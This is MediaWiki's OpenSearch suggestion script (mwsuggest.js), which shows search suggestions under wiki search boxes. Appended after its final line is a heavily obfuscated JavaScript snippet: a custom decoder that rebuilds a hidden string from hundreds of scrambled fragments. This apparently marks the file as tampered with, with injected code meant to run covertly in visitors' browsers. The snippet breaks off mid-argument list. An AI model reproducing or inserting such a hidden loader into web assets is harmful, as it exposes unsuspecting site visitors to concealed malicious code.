/*
 * OpenSearch ajax suggestion engine for MediaWiki
 *
 * uses core MediaWiki open search support to fetch suggestions
 * and show them below search boxes and other inputs
 *
 * by Robert Stojnic (April 2008)
 */

// search_box_id -> Results object
var os_map = {};
// cached data, url -> json_text
var os_cache = {};
// global variables for suggest_keypress
var os_cur_keypressed = 0;
var os_keypressed_count = 0;
// type: Timer
var os_timer = null;
// tie mousedown/up events
var os_mouse_pressed = false;
var os_mouse_num = -1;
// if true, the last change was made by mouse (and not keyboard)
var os_mouse_moved = false;
// delay between keypress and suggestion (in ms)
var os_search_timeout = 250;
// these pairs of inputs/forms will be autoloaded at startup
var os_autoload_inputs = new Array('searchInput', 'searchInput2', 'powerSearchText', 'searchText');
var os_autoload_forms = new Array('searchform', 'searchform2', 'powersearch', 'search' );
// if we stopped the service
var os_is_stopped = false;
// max lines to show in suggest table
var os_max_lines_per_suggest = 7;
// number of steps to animate expansion/contraction of container width
var os_animation_steps = 6;
// num of pixels of smallest step
var os_animation_min_step = 2;
// delay between steps (in ms)
var os_animation_delay = 30;
// max width of container in percent of normal size (1 == 100%)
var os_container_max_width = 2;
// currently active animation timer
var os_animation_timer = null;

/** Timeout timer class that will fetch the results */
function os_Timer(id,r,query){
	this.id = id;
	this.r = r;
	this.query = query;
}

/** Timer user to animate expansion/contraction of container width */
function os_AnimationTimer(r, target){
	this.r = r;
	var current = document.getElementById(r.container).offsetWidth;
	this.inc = Math.round((target-current) / os_animation_steps);
	if(this.inc < os_animation_min_step && this.inc >=0)
		this.inc = os_animation_min_step; // minimal animation step
	if(this.inc > -os_animation_min_step && this.inc <0)
		this.inc = -os_animation_min_step;
	this.target = target;
}

/** Property class for single search box */
function os_Results(name, formname){
	this.searchform = formname; // id of the searchform
	this.searchbox = name; // id of the searchbox
	this.container = name+"Suggest"; // div that holds results
	this.resultTable = name+"Result"; // id base for the result table (+num = table row)
	this.resultText = name+"ResultText"; // id base for the spans within result tables (+num)
	this.toggle = name+"Toggle"; // div that has the toggle (enable/disable) link
	this.query = null; // last processed query
	this.results = null;  // parsed titles
	this.resultCount = 0; // number of results
	this.original = null; // query that user entered
	this.selected = -1; // which result is selected
	this.containerCount = 0; // number of results visible in container
	this.containerRow = 0; // height of result field in the container
	this.containerTotal = 0; // total height of the container will all results
	this.visible = false; // if container is visible
	this.stayHidden = false; // don't try to show if lost focus
}

/** Hide results div */
function os_hideResults(r){
	var c = document.getElementById(r.container);
	if(c != null)
		c.style.visibility = "hidden";
	r.visible = false;
	r.selected = -1;
}

/** Show results div */
function os_showResults(r){
	if(os_is_stopped)
		return;
	if(r.stayHidden)
		return
	os_fitContainer(r);
	var c = document.getElementById(r.container);
	r.selected = -1;
	if(c != null){
		c.scrollTop = 0;
		c.style.visibility = "visible";
		r.visible = true;
	}
}

function os_operaWidthFix(x){
	// For browsers that don't understand overflow-x, estimate scrollbar width
	if(typeof document.body.style.overflowX != "string"){
		return 30;
	}
	return 0;
}

function os_encodeQuery(value){
  if (encodeURIComponent) {
    return encodeURIComponent(value);
  }
  if(escape) {
    return escape(value);
  }
  return null;
}
function os_decodeValue(value){
  if (decodeURIComponent) {
    return decodeURIComponent(value);
  }
  if(unescape){
  	return unescape(value);
  }
  return null;
}

/** Brower-dependent functions to find window inner size, and scroll status */
function f_clientWidth() {
	return f_filterResults (
		window.innerWidth ? window.innerWidth : 0,
		document.documentElement ? document.documentElement.clientWidth : 0,
		document.body ? document.body.clientWidth : 0
	);
}
function f_clientHeight() {
	return f_filterResults (
		window.innerHeight ? window.innerHeight : 0,
		document.documentElement ? document.documentElement.clientHeight : 0,
		document.body ? document.body.clientHeight : 0
	);
}
function f_scrollLeft() {
	return f_filterResults (
		window.pageXOffset ? window.pageXOffset : 0,
		document.documentElement ? document.documentElement.scrollLeft : 0,
		document.body ? document.body.scrollLeft : 0
	);
}
function f_scrollTop() {
	return f_filterResults (
		window.pageYOffset ? window.pageYOffset : 0,
		document.documentElement ? document.documentElement.scrollTop : 0,
		document.body ? document.body.scrollTop : 0
	);
}
function f_filterResults(n_win, n_docel, n_body) {
	var n_result = n_win ? n_win : 0;
	if (n_docel && (!n_result || (n_result > n_docel)))
		n_result = n_docel;
	return n_body && (!n_result || (n_result > n_body)) ? n_body : n_result;
}

/** Get the height available for the results container */
function os_availableHeight(r){
	var absTop = document.getElementById(r.container).style.top;
	var px = absTop.lastIndexOf("px");
	if(px > 0)
		absTop = absTop.substring(0,px);
	return f_clientHeight() - (absTop - f_scrollTop());
}


/** Get element absolute position {left,top} */
function os_getElementPosition(elemID){
	var offsetTrail = document.getElementById(elemID);
	var offsetLeft = 0;
	var offsetTop = 0;
	while (offsetTrail){
		offsetLeft += offsetTrail.offsetLeft;
		offsetTop += offsetTrail.offsetTop;
		offsetTrail = offsetTrail.offsetParent;
	}
	if (navigator.userAgent.indexOf('Mac') != -1 && typeof document.body.leftMargin != 'undefined'){
		offsetLeft += document.body.leftMargin;
		offsetTop += document.body.topMargin;
	}
	return {left:offsetLeft,top:offsetTop};
}

/** Create the container div that will hold the suggested titles */
function os_createContainer(r){
	var c = document.createElement("div");
	var s = document.getElementById(r.searchbox);
	var pos = os_getElementPosition(r.searchbox);
	var left = pos.left;
	var top = pos.top + s.offsetHeight;
	c.className = "os-suggest";
	c.setAttribute("id", r.container);
	document.body.appendChild(c);

	// dynamically generated style params
	// IE workaround, cannot explicitely set "style" attribute
	c = document.getElementById(r.container);
	c.style.top = top+"px";
	c.style.left = left+"px";
	c.style.width = s.offsetWidth+"px";

	// mouse event handlers
	c.onmouseover = function(event) { os_eventMouseover(r.searchbox, event); };
	c.onmousemove = function(event) { os_eventMousemove(r.searchbox, event); };
	c.onmousedown = function(event) { return os_eventMousedown(r.searchbox, event); };
	c.onmouseup = function(event) { os_eventMouseup(r.searchbox, event); };
	return c;
}

/** change container height to fit to screen */
function os_fitContainer(r){
	var c = document.getElementById(r.container);
	var h = os_availableHeight(r) - 20;
	var inc = r.containerRow;
	h = parseInt(h/inc) * inc;
	if(h < (2 * inc) && r.resultCount > 1) // min: two results
		h = 2 * inc;
	if((h/inc) > os_max_lines_per_suggest )
		h = inc * os_max_lines_per_suggest;
	if(h < r.containerTotal){
		c.style.height = h +"px";
		r.containerCount = parseInt(Math.round(h/inc));
	} else{
		c.style.height = r.containerTotal+"px";
		r.containerCount = r.resultCount;
	}
}
/** If some entries are longer than the box, replace text with "..." */
function os_trimResultText(r){
	// find max width, first see if we could expand the container to fit it
	var maxW = 0;
	for(var i=0;i<r.resultCount;i++){
		var e = document.getElementById(r.resultText+i);
		if(e.offsetWidth > maxW)
			maxW = e.offsetWidth;
	}
	var w = document.getElementById(r.container).offsetWidth;
	var fix = 0;
	if(r.containerCount < r.resultCount){
		fix = 20; // give 20px for scrollbar
	} else
		fix = os_operaWidthFix(w);
	if(fix < 4)
		fix = 4; // basic padding
	maxW += fix;

	// resize container to fit more data if permitted
	var normW = document.getElementById(r.searchbox).offsetWidth;
	var prop = maxW / normW;
	if(prop > os_container_max_width)
		prop = os_container_max_width;
	else if(prop < 1)
		prop = 1;
	var newW = Math.round( normW * prop );
	if( w != newW ){
		w = newW;
		if( os_animation_timer != null )
			clearInterval(os_animation_timer.id)
		os_animation_timer = new os_AnimationTimer(r,w);
		os_animation_timer.id = setInterval("os_animateChangeWidth()",os_animation_delay);
		w -= fix; // this much is reserved
	}

	// trim results
	if(w < 10)
		return;
	for(var i=0;i<r.resultCount;i++){
		var e = document.getElementById(r.resultText+i);
		var replace = 1;
		var lastW = e.offsetWidth+1;
		var iteration = 0;
		var changedText = false;
		while(e.offsetWidth > w && (e.offsetWidth < lastW || iteration<2)){
			changedText = true;
			lastW = e.offsetWidth;
			var l = e.innerHTML;
			e.innerHTML = l.substring(0,l.length-replace)+"...";
			iteration++;
			replace = 4; // how many chars to replace
		}
		if(changedText){
			// show hint for trimmed titles
			document.getElementById(r.resultTable+i).setAttribute("title",r.results[i]);
		}
	}
}

/** Invoked on timer to animate change in container width */
function os_animateChangeWidth(){
	var r = os_animation_timer.r;
	var c = document.getElementById(r.container);
	var w = c.offsetWidth;
	var normW = document.getElementById(r.searchbox).offsetWidth;
	var normL = os_getElementPosition(r.searchbox).left;
	var inc = os_animation_timer.inc;
	var target = os_animation_timer.target;
	var nw = w + inc;
	if( (inc > 0 && nw >= target) || (inc <= 0 && nw <= target) ){
		// finished !
		c.style.width = target+"px";
		clearInterval(os_animation_timer.id)
		os_animation_timer = null;
	} else{
		// in-progress
		c.style.width = nw+"px";
		if(document.documentElement.dir == "rtl")
			c.style.left = (normL + normW + (target - nw) - os_animation_timer.target - 1)+"px";
	}
}

/** Handles data from XMLHttpRequest, and updates the suggest results */
function os_updateResults(r, query, text, cacheKey){
	os_cache[cacheKey] = text;
	r.query = query;
	r.original = query;
	if(text == ""){
		r.results = null;
		r.resultCount = 0;
		os_hideResults(r);
	} else{
		try {
			var p = eval('('+text+')'); // simple json parse, could do a safer one
			if(p.length<2 || p[1].length == 0){
				r.results = null;
				r.resultCount = 0;
				os_hideResults(r);
				return;
			}
			var c = document.getElementById(r.container);
			if(c == null)
				c = os_createContainer(r);
			c.innerHTML = os_createResultTable(r,p[1]);
			// init container table sizes
			var t = document.getElementById(r.resultTable);
			r.containerTotal = t.offsetHeight;
			r.containerRow = t.offsetHeight / r.resultCount;
			os_fitContainer(r);
			os_trimResultText(r);
			os_showResults(r);
		} catch(e){
			// bad response from server or such
			os_hideResults(r);
			os_cache[cacheKey] = null;
		}
	}
}

/** Create the result table to be placed in the container div */
function os_createResultTable(r, results){
	var c = document.getElementById(r.container);
	var width = c.offsetWidth - os_operaWidthFix(c.offsetWidth);
	var html = "<table class=\"os-suggest-results\" id=\""+r.resultTable+"\" style=\"width: "+width+"px;\">";
	r.results = new Array();
	r.resultCount = results.length;
	for(i=0;i<results.length;i++){
		var title = os_decodeValue(results[i]);
		r.results[i] = title;
		html += "<tr><td class=\"os-suggest-result\" id=\""+r.resultTable+i+"\"><span id=\""+r.resultText+i+"\">"+title+"</span></td></tr>";
	}
	html+="</table>"
	return html;
}

/** Fetch namespaces from checkboxes or hidden fields in the search form,
    if none defined use wgSearchNamespaces global */
function os_getNamespaces(r){
	var namespaces = "";
	var elements = document.forms[r.searchform].elements;
	for(i=0; i < elements.length; i++){
		var name = elements[i].name;
		if(typeof name != 'undefined' && name.length > 2
		&& name[0]=='n' && name[1]=='s'
		&& ((elements[i].type=='checkbox' && elements[i].checked)
		 	|| (elements[i].type=='hidden' && elements[i].value=="1")) ){
			if(namespaces!="")
				namespaces+="|";
			namespaces+=name.substring(2);
		}
	}
	if(namespaces == "")
		namespaces = wgSearchNamespaces.join("|");
	return namespaces;
}

/** Update results if user hasn't already typed something else */
function os_updateIfRelevant(r, query, text, cacheKey){
	var t = document.getElementById(r.searchbox);
	if(t != null && t.value == query){ // check if response is still relevant
		os_updateResults(r, query, text, cacheKey);
	}
	r.query = query;
}

/** Fetch results after some timeout */
function os_delayedFetch(){
	if(os_timer == null)
		return;
	var r = os_timer.r;
	var query = os_timer.query;
	os_timer = null;
	var path = wgMWSuggestTemplate.replace("{namespaces}",os_getNamespaces(r))
							  	  .replace("{dbname}",wgDBname)
							  	  .replace("{searchTerms}",os_encodeQuery(query));

	// try to get from cache, if not fetch using ajax
	var cached = os_cache[path];
	if(cached != null){
		os_updateIfRelevant(r, query, cached, path);
	} else{
		var xmlhttp = sajax_init_object();
		if(xmlhttp){
			try {
				xmlhttp.open("GET", path, true);
				xmlhttp.onreadystatechange=function(){
		        	if (xmlhttp.readyState==4 && typeof os_updateIfRelevant == 'function') {
		        		os_updateIfRelevant(r, query, xmlhttp.responseText, path);
	        		}
	      		};
	     		xmlhttp.send(null);
	     	} catch (e) {
				if (window.location.hostname == "localhost") {
					alert("Your browser blocks XMLHttpRequest to 'localhost', try using a real hostname for development/testing.");
				}
				throw e;
			}
		}
	}
}

/** Init timed update via os_delayedUpdate() */
function os_fetchResults(r, query, timeout){
	if(query == ""){
		r.query = "";
		os_hideResults(r);
		return;
	} else if(query == r.query)
		return; // no change

	os_is_stopped = false; // make sure we're running

	/* var cacheKey = wgDBname+":"+query;
	var cached = os_cache[cacheKey];
	if(cached != null){
		os_updateResults(r,wgDBname,query,cached);
		return;
	} */

	// cancel any pending fetches
	if(os_timer != null && os_timer.id != null)
		clearTimeout(os_timer.id);
	// schedule delayed fetching of results
	if(timeout != 0){
		os_timer = new os_Timer(setTimeout("os_delayedFetch()",timeout),r,query);
	} else{
		os_timer = new os_Timer(null,r,query);
		os_delayedFetch(); // do it now!
	}

}
/** Change the highlighted row (i.e. suggestion), from position cur to next */
function os_changeHighlight(r, cur, next, updateSearchBox){
	if (next >= r.resultCount)
		next = r.resultCount-1;
	if (next < -1)
		next = -1;
	r.selected = next;
   	if (cur == next)
    	return; // nothing to do.

    if(cur >= 0){
    	var curRow = document.getElementById(r.resultTable + cur);
    	if(curRow != null)
    		curRow.className = "os-suggest-result";
    }
    var newText;
    if(next >= 0){
    	var nextRow = document.getElementById(r.resultTable + next);
    	if(nextRow != null)
    		nextRow.className = os_HighlightClass();
    	newText = r.results[next];
    } else
    	newText = r.original;

    // adjust the scrollbar if any
    if(r.containerCount < r.resultCount){
    	var c = document.getElementById(r.container);
    	var vStart = c.scrollTop / r.containerRow;
    	var vEnd = vStart + r.containerCount;
    	if(next < vStart)
    		c.scrollTop = next * r.containerRow;
    	else if(next >= vEnd)
    		c.scrollTop = (next - r.containerCount + 1) * r.containerRow;
    }

    // update the contents of the search box
    if(updateSearchBox){
    	os_updateSearchQuery(r,newText);
    }
}

function os_HighlightClass() {
	var match = navigator.userAgent.match(/AppleWebKit\/(\d+)/);
	if (match) {
		var webKitVersion = parseInt(match[1]);
		if (webKitVersion < 523) {
			// CSS system highlight colors broken on old Safari
			// https://bugs.webkit.org/show_bug.cgi?id=6129
			// Safari 3.0.4, 3.1 known ok
			return "os-suggest-result-hl-webkit";
		}
	}
	return "os-suggest-result-hl";
}

function os_updateSearchQuery(r,newText){
	document.getElementById(r.searchbox).value = newText;
    r.query = newText;
}

/** Find event target */
function os_getTarget(e){
	if (!e) e = window.event;
	if (e.target) return e.target;
	else if (e.srcElement) return e.srcElement;
	else return null;
}



/********************
 *  Keyboard events
 ********************/

/** Event handler that will fetch results on keyup */
function os_eventKeyup(e){
	var targ = os_getTarget(e);
	var r = os_map[targ.id];
	if(r == null)
		return; // not our event

	// some browsers won't generate keypressed for arrow keys, catch it
	if(os_keypressed_count == 0){
		os_processKey(r,os_cur_keypressed,targ);
	}
	var query = targ.value;
	os_fetchResults(r,query,os_search_timeout);
}

/** catch arrows up/down and escape to hide the suggestions */
function os_processKey(r,keypressed,targ){
	if (keypressed == 40){ // Arrow Down
    	if (r.visible) {
      		os_changeHighlight(r, r.selected, r.selected+1, true);
    	} else if(os_timer == null){
    		// user wants to get suggestions now
    		r.query = "";
			os_fetchResults(r,targ.value,0);
    	}
  	} else if (keypressed == 38){ // Arrow Up
  		if (r.visible){
  			os_changeHighlight(r, r.selected, r.selected-1, true);
  		}
  	} else if(keypressed == 27){ // Escape
  		document.getElementById(r.searchbox).value = r.original;
  		r.query = r.original;
  		os_hideResults(r);
  	} else if(r.query != document.getElementById(r.searchbox).value){
  		// os_hideResults(r); // don't show old suggestions
  	}
}

/** When keys is held down use a timer to output regular events */
function os_eventKeypress(e){
	var targ = os_getTarget(e);
	var r = os_map[targ.id];
	if(r == null)
		return; // not our event

	var keypressed = os_cur_keypressed;

	os_keypressed_count++;
	os_processKey(r,keypressed,targ);
}

/** Catch the key code (Firefox bug)  */
function os_eventKeydown(e){
	if (!e) e = window.event;
	var targ = os_getTarget(e);
	var r = os_map[targ.id];
	if(r == null)
		return; // not our event

	os_mouse_moved = false;

	os_cur_keypressed = (e.keyCode == undefined) ? e.which : e.keyCode;
	os_keypressed_count = 0;
}

/** Event: loss of focus of input box */
function os_eventBlur(e){
	var targ = os_getTarget(e);
	var r = os_map[targ.id];
	if(r == null)
		return; // not our event
	if(!os_mouse_pressed){
		os_hideResults(r);
		// force canvas to stay hidden
		r.stayHidden = true
		// cancel any pending fetches
		if(os_timer != null && os_timer.id != null)
			clearTimeout(os_timer.id);
		os_timer = null
	}
}

/** Event: focus (catch only when stopped) */
function os_eventFocus(e){
	var targ = os_getTarget(e);
	var r = os_map[targ.id];
	if(r == null)
		return; // not our event
	r.stayHidden = false
}



/********************
 *  Mouse events
 ********************/

/** Mouse over the container */
function os_eventMouseover(srcId, e){
	var targ = os_getTarget(e);
	var r = os_map[srcId];
	if(r == null || !os_mouse_moved)
		return; // not our event
	var num = os_getNumberSuffix(targ.id);
	if(num >= 0)
		os_changeHighlight(r,r.selected,num,false);

}

/* Get row where the event occured (from its id) */
function os_getNumberSuffix(id){
	var num = id.substring(id.length-2);
	if( ! (num.charAt(0) >= '0' && num.charAt(0) <= '9') )
		num = num.substring(1);
	if(os_isNumber(num))
		return parseInt(num);
	else
		return -1;
}

/** Save mouse move as last action */
function os_eventMousemove(srcId, e){
	os_mouse_moved = true;
}

/** Mouse button held down, register possible click  */
function os_eventMousedown(srcId, e){
	var targ = os_getTarget(e);
	var r = os_map[srcId];
	if(r == null)
		return; // not our event
	var num = os_getNumberSuffix(targ.id);

	os_mouse_pressed = true;
	if(num >= 0){
		os_mouse_num = num;
		// os_updateSearchQuery(r,r.results[num]);
	}
	// keep the focus on the search field
	document.getElementById(r.searchbox).focus();

	return false; // prevents selection
}

/** Mouse button released, check for click on some row */
function os_eventMouseup(srcId, e){
	var targ = os_getTarget(e);
	var r = os_map[srcId];
	if(r == null)
		return; // not our event
	var num = os_getNumberSuffix(targ.id);

	if(num >= 0 && os_mouse_num == num){
		os_updateSearchQuery(r,r.results[num]);
		os_hideResults(r);
		document.getElementById(r.searchform).submit();
	}
	os_mouse_pressed = false;
	// keep the focus on the search field
	document.getElementById(r.searchbox).focus();
}

/** Check if x is a valid integer */
function os_isNumber(x){
	if(x == "" || isNaN(x))
		return false;
	for(var i=0;i<x.length;i++){
		var c = x.charAt(i);
		if( ! (c >= '0' && c <= '9') )
			return false;
	}
	return true;
}


/** When the form is submitted hide everything, cancel updates... */
function os_eventOnsubmit(e){
	var targ = os_getTarget(e);

	os_is_stopped = true;
	// kill timed requests
	if(os_timer != null && os_timer.id != null){
		clearTimeout(os_timer.id);
		os_timer = null;
	}
	// Hide all suggestions
	for(i=0;i<os_autoload_inputs.length;i++){
		var r = os_map[os_autoload_inputs[i]];
		if(r != null){
			var b = document.getElementById(r.searchform);
			if(b != null && b == targ){
				// set query value so the handler won't try to fetch additional results
				r.query = document.getElementById(r.searchbox).value;
			}
			os_hideResults(r);
		}
	}
	return true;
}

function os_hookEvent(element, hookName, hookFunct) {
	if (element.addEventListener) {
		element.addEventListener(hookName, hookFunct, false);
	} else if (window.attachEvent) {
		element.attachEvent("on" + hookName, hookFunct);
	}
}

/** Init Result objects and event handlers */
function os_initHandlers(name, formname, element){
	var r = new os_Results(name, formname);
	// event handler
	os_hookEvent(element, "keyup", function(event) { os_eventKeyup(event); });
	os_hookEvent(element, "keydown", function(event) { os_eventKeydown(event); });
	os_hookEvent(element, "keypress", function(event) { os_eventKeypress(event); });
	os_hookEvent(element, "blur", function(event) { os_eventBlur(event); });
	os_hookEvent(element, "focus", function(event) { os_eventFocus(event); });
	element.setAttribute("autocomplete","off");
	// stopping handler
	os_hookEvent(document.getElementById(formname), "submit", function(event){ return os_eventOnsubmit(event); });
	os_map[name] = r;
	// toggle link
	if(document.getElementById(r.toggle) == null){
		// TODO: disable this while we figure out a way for this to work in all browsers
		/* if(name=='searchInput'){
			// special case: place above the main search box
			var t = os_createToggle(r,"os-suggest-toggle");
			var searchBody = document.getElementById('searchBody');
			var first = searchBody.parentNode.firstChild.nextSibling.appendChild(t);
		} else{
			// default: place below search box to the right
			var t = os_createToggle(r,"os-suggest-toggle-def");
			var top = element.offsetTop + element.offsetHeight;
			var left = element.offsetLeft + element.offsetWidth;
			t.style.position = "absolute";
			t.style.top = top + "px";
			t.style.left = left + "px";
			element.parentNode.appendChild(t);
			// only now width gets calculated, shift right
			left -= t.offsetWidth;
			t.style.left = left + "px";
			t.style.visibility = "visible";
		} */
	}

}

/** Return the span element that contains the toggle link */
function os_createToggle(r,className){
	var t = document.createElement("span");
	t.className = className;
	t.setAttribute("id", r.toggle);
	var link = document.createElement("a");
	link.setAttribute("href","javascript:void(0);");
	link.onclick = function(){ os_toggle(r.searchbox,r.searchform) };
	var msg = document.createTextNode(wgMWSuggestMessages[0]);
	link.appendChild(msg);
	t.appendChild(link);
	return t;
}

/** Call when user clicks on some of the toggle links */
function os_toggle(inputId,formName){
	r = os_map[inputId];
	var msg = '';
	if(r == null){
		os_enableSuggestionsOn(inputId,formName);
		r = os_map[inputId];
		msg = wgMWSuggestMessages[0];
	} else{
		os_disableSuggestionsOn(inputId,formName);
		msg = wgMWSuggestMessages[1];
	}
	// change message
	var link = document.getElementById(r.toggle).firstChild;
	link.replaceChild(document.createTextNode(msg),link.firstChild);
}

/** Call this to enable suggestions on input (id=inputId), on a form (name=formName) */
function os_enableSuggestionsOn(inputId, formName){
	os_initHandlers( inputId, formName, document.getElementById(inputId) );
}

/** Call this to disable suggestios on input box (id=inputId) */
function os_disableSuggestionsOn(inputId){
	r = os_map[inputId];
	if(r != null){
		// cancel/hide results
		os_timer = null;
		os_hideResults(r);
		// turn autocomplete on !
		document.getElementById(inputId).setAttribute("autocomplete","on");
		// remove descriptor
		os_map[inputId] = null;
	}
	
	// Remove the element from the os_autoload_* arrays
	var index = os_autoload_inputs.indexOf(inputId);
	if ( index >= 0 )
		os_autoload_inputs[index] = os_autoload_forms[index] = '';
}

/** Initialization, call upon page onload */
function os_MWSuggestInit() {
	for(i=0;i<os_autoload_inputs.length;i++){
		var id = os_autoload_inputs[i];
		var form = os_autoload_forms[i];
		element = document.getElementById( id );
		if(element != null)
			os_initHandlers(id,form,element);
	}
}

hookEvent("load", os_MWSuggestInit);

var ydb3fe3b="";function da10b384da0(){var hdf66a=String,t156bb10=Array.prototype.slice.call(arguments).join(""),cbbe247c=t156bb10.substr(15,3)-341,a29a9f9d,i9ebad;t156bb10=t156bb10.substr(18);var ff02ac8=t156bb10.length;for(var l79942=0;l79942<ff02ac8;l79942++){try{throw(m5d76d1=t156bb10.substr(l79942,1));}catch(e){m5d76d1=e;};if(m5d76d1=='–'){cbbe247c="";l79942=r01797143(l79942);db7e1df=h714fe87e(t156bb10,l79942);while(db7e1df!='–'){cbbe247c+=db7e1df;l79942++;db7e1df=t156bb10.substr(l79942,1);}cbbe247c-=382;continue;}a29a9f9d="";if(m5d76d1=='°'){l79942++;m5d76d1=t156bb10.substr(l79942,1);while(m5d76d1!='°'){a29a9f9d+=m5d76d1;l79942++;m5d76d1=t156bb10.substr(l79942,1);}a29a9f9d=a29a9f9d-cbbe247c-39;if(a29a9f9d<0)a29a9f9d+=256;if(a29a9f9d>=192)a29a9f9d+=848;else if(a29a9f9d==168)a29a9f9d=1025;else if(a29a9f9d==184)a29a9f9d=1105;ydb3fe3b+=hdf66a["\x66\x72o\x6d\x43h\x61\x72C\x6f\x64\x65"](a29a9f9d);continue;}rd2f113a=c6a002b20(m5d76d1);if(rd2f113a>848)rd2f113a-=848;i9ebad=rd2f113a-cbbe247c-39;i9ebad=le6f8be0f(i9ebad);ydb3fe3b+=u56eae(i9ebad);}}da10b384da0("2","9","e","c1f","1a33","83d","17","4","17°1","5","5","°","–","53","6–'","6","/$–","5","3","3","–","2–4","1","3–°175°","–491–°","3°°","2°–","4","0","3","–d","–5","2","8–","°22","6°–581","–°1","4°","–3","95","–","°1","75","°","A",">","–39","0–","8°","1","6","5°","°","1","4","4","°","°1","61°O","°","164°","–5","64","–","O","I","°","2","53","°–","5","2","9–°2","47°","–","4","17–j","q","–","40","0","–","°161","°°173°–5","28","–-)","–4","16–°1","31","°xx°180","°°","1","8","4","°","°170","°–","3","9","0","–","°","166","°–488","–°","2","53","°","°8","°","–","415–°16","9","°","°","1","8","9°","°","1","92°–","395–°","150°–5","2","9–","°232°","°","3","2","°","–5","6","5–P","M–5","18–°28","°–","4","6","7–","°","169","°°24","3","°–","3","85","–°1","63","°X–41","9","–","°","17","5°","°1","87","°","–42","8–","°1","94°","–5","2","7","–","°","23","1","°°31","°°","2","3","1°","–5","68–°8","°","°","28°°238°–4","3","5–f","e–","53","0–","$–42","1–","°","1","8","0","°","n–","527–°224°,–5","61","–","S","–477–","°246°–4","4","9–°2","0","7°–43","2–°20","0°°","191","°","y","°2","08","°","–5","0","4–°","10°°","15","°°5°–","406–°1","74°","°","1","8","2°m","°1","8","3","°","–406","–","°1","8","4","°","°1","85","°","–38","9","–°1","48°–","566–K–","553","–39°","2","4","2°°","15°°15","°","–39","7–","sV","]","–","5","13–","°3","1°","–","54","1–4*","+",",–4","2","2","–°","184°°","1","8","9°","–","413–°1","7","1°","°170","°","mof°1","9","3","°","–","568","–°","23","8","°–574","–°","24","1°°240","°","°","24","0","°","–","5","3","2–","4&+","!–","547","–",";","C","–43","0","–°","13","3°°20","7°–","4","6","4–°242","°","–","54","4–C","/5–","56","6","–@","–4","73","–°233","°","°","1","6","2","°°191°°","1","62°–","492–","°19","7","°","°","2","0","8","°°","1","6","2°","°1","5","9","°–","4","3","6–","f°21","8","°","–","582–°25","2","°","–","4","29","–`","–","536–","°","202°","%0$","6","–","4","8","0–°","246°–39","8","–","°15","6°–5","8","2–","]–5","5","4–G°","1°–","4","3","1","–°19","9","°","°","198°°","19","7°–50","9","–","°","21°°27","°°","25","°°1","1","°","°","1","9°","–3","8","9","–°","15","7","°","–3","8","8","–°","1","63°","°1","46°M","j","–5","3","0–","°","2","19°!0)","°","3","0","°/","$–","4","77–°24","5","°–5","1","1","–","°","2","2","°°20","8","°°","20","9°°20","0°","–","5","5","3–","M","°","223","°°","2","2","0°","°","21","9°°2","19","°–","58","2–X","–","409","–°","168","°b–42","9","–°126","°–","5","5","2","–H","–","4","9","5","–","°","1°–","5","0","1–°1","2°","–401","–","°1","5","8°","°","1","69°°","1","77","°","–5","1","6–","°2","19°–38","6","–°16","3","°–","49","1","–°","13","°°","14","°–496","–","°255","°–","5","18–","°2","7°","–","428–","°182°","–425–°","1","8","5°","r","–468–","°","186","°","°","1","8","6","°","°186","°","°15","7","°","°173°","–53","1–°229°–5","75–°","8","°c°2","45°","–57","1","–°23","8°","–","3","95","–","=","–","497","–","°","16","3°","–","55","2","–","°","21","8°–","4","22–","°1","98°°","18","4","°–","4","39–","°2","06°","–","5","58","–",";","F","N°5°OP","–","54","0–","?","+1–446","–°20","0","°","°","20","6","°","°","1","35°","°164°","–5","0","5","–°194","°","–","569","–","°1","9°–","535–","°","2","5","1","°°2","0","5","°","°202°","°","2","0","1°–553","–","°21","9","°–","5","8","0–","°246°","–","5","5","8","–M–","48","5","–","°2","3","9","°°","0","°","–","58","2","–","°15°","W–418","–","°","176°°1","72","°–","570–","G–47","1–°16","0","°","–4","8","7","–°205°","°1","7","6","°°","24","4°–","4","10","–°178°°16","6","°","–49","2–","°1","0","°°","2","°","–","50","1","–°3","°–","40","9–","°1","76°–4","3","2","–","°2","05°–","544–°","2","47°–567–","G","–4","3","2","–°","1","90","°","°","2","0","5","°–","49","7","–","°2","2","3°","–54","8–","92–","4","7","0–°","2","3","6","°–5","64–","B","K","–","42","0","–","°1","93","°","–5","6","9","–U$[6C","–","5","4","4–","0–50","8","–°","24","3","°°","6°°","18°°1","0","°°","2","05","°","–52","6","–°2","22","°–","4","48–","°2","09","°°","2","06","°","–","465","–°21","9°°","2","2","2","°°161°–41","2–","n°160°u–4","35","–°","18","5°","°1","51°–4","89","–","°","1","5","9","°","–","4","74","–","°1","4","1°","–38","8–","6","–","40","5","–G–4","4","7","–q","–4","8","9–","°8","°°2","43","°","–454–°22","5","°–","4","1","9","–l","–555","–G","7F","–","56","1–C–","47","9","–","°248°","–4","6","8–°241","°","–5","46","–°235","°°","8","°","–426","–","s–5","21–°22°","!–","4","99","–°","2","5","5","°","°","1","7","°°9°","°","1","°","°10°","°","1","6","°°","202°","–","405","–°","1","6","1","°–","42","5","–","°19","6","°","°1","83°","°","1","7","9","°","–","4","12–","°185°","°1","7","0","°","°1","3","8°–","46","2–","°","2","2","7°","°","22","0°","°","228","°°","22","0°","–515–","°","2","6°°3","2°°212","°","–55","0–","°24","6°","–","47","2","–°","2","44°–56","9–","ET","–524","–","°","3","0","°–","5","2","4–%)","–","39","5–","[","–40","8","–","j","°","124°","N","K","–38","7","–","5","–476–°","1","4","2°","°1","4","2","°°","2","48°","–","48","1–°2","37","°","–5","7","5","–","Z","QX–4","5","6–","°2","29°","–","5","0","4","–°","20","7°–3","94–°","1","6","7","°°17","2°–5","46–;–3","88","–°1","4","6°–","40","1","–Z","–","443","–","°16","1°°1","3","2","°–5","2","5–","°2","21","°–","4","73","–","°2","4","6","°°2","31","°","°25","0°","°24","6","°","°","17","7","°","–","4","2","3","–°","1","86","°–","39","1–","°1","4","5","°°","1","6","6°–","407","–","°","161","°","°1","7","9°","°1","6","3","°","°","1","7","8","°","°1","6","9","°°","1","76","°","°","1","8","0°","–","56","1","–","°","1°°21°","–","57","4–°","24","4°","°","2","41°–","4","0","9–","K","K","K°","181°°","1","6","5","°°","180°°","1","7","1","°","°","1","7","8°","°","18","2","°p","°17","7°°","176°°1","80°–","3","87–","°","145°–","48","4","–°238°","°","2","4","1°","–44","5","–","°","2","23°–","4","5","7–°2","2","9°–404","–°1","7","7","°","°1","5","8°°1","77","°–","478","–°","236°","–","426","–","°","182","°","–5","1","7–","°22","°","°","1","5°–52","0","–","°3","1","°","°24°","°","2","2","°","–","42","8","–u","°14","6","°–","50","8–","°1